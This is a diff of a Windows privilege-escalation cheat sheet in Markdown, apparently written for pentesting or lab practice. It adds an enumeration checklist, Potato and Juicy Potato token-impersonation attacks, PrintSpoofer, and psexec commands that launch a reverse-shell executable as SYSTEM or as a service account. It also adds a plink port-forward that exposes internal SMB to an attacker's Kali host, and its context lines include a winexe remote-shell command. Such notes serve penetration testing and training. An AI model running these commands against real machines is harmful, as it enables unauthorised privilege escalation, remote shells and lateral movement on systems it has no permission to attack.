@@ -10,8 +10,23 @@ PS> cd $env:temp
 cmd> cd %TEMP%
 ```
 
-
 ## Enumeration
+
+Basic Strategy
+
+1. Check `whoami` and groups with `net user <username>`
+2. `winpeas.exe quiet fast searchfast cmd`
+3. Run seatbelt and other enumeration scripts
+4. Run manual commands if needed 
+5. Look for non windows programs and services
+6. If windows version is old then try potatoes if privileges are there
+7. If nothing works use kernel exploits
+
+* Take time to look for low hanging fruits but avoid rabbit holes: registry, services ...
+* Check files and folders looking for interesting files
+* look for internal ports
+* Check users
+* 
 
 ### Find Process and its ACL
 
@@ -549,8 +564,42 @@ oLink.Save
 * Look for possbible vulnerable apps using `seatbelt.exe` on victim or `tasklist /V` or `winpeas.exe quiet processinfo`
 * find the exploit on `exploit.db` as shown above
 
-#### Hot Potato
+#### Potatoes
 
+Works on Win 7,8 and early 10. Latest win 10 is patched.
+
+Relies on NTLM relay from auth to fake http server to SMB to get SYSTEM.
+
+* Execute potato
+
+```powershell
+
+.\potato.exe -ip 192.168.1.39 -cmd "C:\Temp\rev_shell.exe" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true
+
+```
+
+#### Token Impersonation
+
+Patched on latest windows 10.
+
+* Need remote access to service accont like `nt authority\local service`
+* This shall tipically work if following privileges are available `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`
+* Next, find CLSID `http://ohpe.it/juicy-potato/CLSID/`
+* Copy juicy potato and run it
+
+For later versions use Rogue Potato.
+
+#### PrintSpoofer
+
+* Works on newer machines.
+* needs `vc_redist.x64.exe`
+* Check priviliges for impersonation
+* Run exploit
+
+```powershell
+
+.\PrintSpoofer.exe -i -c "c:\Temp\rev_shell.exe"
+```
 
 
 ### Kernel Exploits
@@ -665,6 +714,13 @@ i686-w64-mingw32-gcc shell.c -o shell.exe
 * Once Admin privileges obtained get SYSTEM shell
 `psexec -accepteula -sid cmd.exe`
 
+Or connect as other service if needed from victim
+
+```powershell
+
+.\psexec.exe /accepteula -i -u "nt authority\local service" c:\rev_shell.exe
+```
+
 * look for stuff
 `Get-Childitem –Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
 
@@ -681,7 +737,7 @@ i686-w64-mingw32-gcc shell.c -o shell.exe
 
 `powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""`
 
-## Use winexe 
+## Use winexe
 
 In kali there is winexe tool that allows running remote commands on windows
 
@@ -689,6 +745,16 @@ In kali there is winexe tool that allows running remote commands on windows
 #to spawn remote cmd SYSTEM shell
 winexe -U 'admin%password123' --system //192.168.1.xxx cmd.exe
 ```
+
+## Port Forwarding from Windows
+
+* Sometimes internal vulnerable ports need to be forwarded to Kali. For example for port 445 with SMB
+* use `plink.exe`
+* on kali enable root login on ssh `vim /etc/ssh/sshd_config` PermitRootLogin yes. Then `service ssh restart`
+* ssh must be running
+* Run forwarding `plink.exe root@192.168.1.10 -R 445:127.0.0.1:445` where first port is dest and second is source and ip source,
+* now  use any tools and target `127.0.0.1:445` on kali machine like `winexe`
+
 
 # Firewall
 
